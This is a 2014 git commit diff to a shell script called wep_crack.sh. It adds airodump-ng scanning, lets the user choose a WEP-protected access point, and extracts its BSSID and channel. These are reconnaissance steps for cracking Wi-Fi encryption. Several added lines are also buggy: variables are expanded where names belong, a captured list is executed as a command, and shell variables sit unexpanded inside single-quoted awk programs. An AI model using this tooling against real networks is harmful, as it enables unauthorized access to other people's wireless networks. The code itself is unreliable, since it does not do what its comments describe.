c9cb01f947accb35ac75c45f3bcec54693b84fe9
Sreejith <sreejith.r44@gmail.com>
2014-07-16 03:25:36 +0530

    Extraction of BSSID and channel of access point ready

--- wep_crack.sh
+++ wep_crack.sh
@@ -67,9 +67,30 @@ start_interface_in_monitor_mode() {
 scan_access_point() {
     echo "[+] Using $1 to scan for WEP-protected access points.."
     echo "[+] Press ENTER to stop scan"
+
+    # Run the command in the background and redirect the outputs to both
+    # the terminal screen and a temporary file (name set in $TMP_AIRODUMP_FILE)
     airodump-ng $1 | tee /dev/tty >> $TMP_AIRODUMP_FILE &
     read $enter_key
+    # On hitting Enter key, kill the previous process
     kill -9 "$!"
+    clear
+
+    # Extract the access point names from the temporary file we just created
+    access_points=`cat $TMP_AIRODUMP_FILE | awk '($8=="WEP") {print NR") "$11}'`
+    echo "Select an access point:"
+    echo `$access_points`
+    # Let the user select an access point
+    read $access_point_number
+
+    # Extract access point name from the number the user entered in the last step
+    access_point_name=`echo $access_points | awk '($1==$access_point_number) {print $2}'`
+    access_point_details=`cat $TMP_AIRODUMP_FILE | awk '($11==$access_point_name) {print $1, $6}'`
+
+    # Extract the BSSID & channel of the access point
+    access_point_bssid=`echo $access_point_details | awk '{print $1}'`
+    access_point_channel=`echo $access_point_details | awk '{print $2}'`
+    
 }
 
 
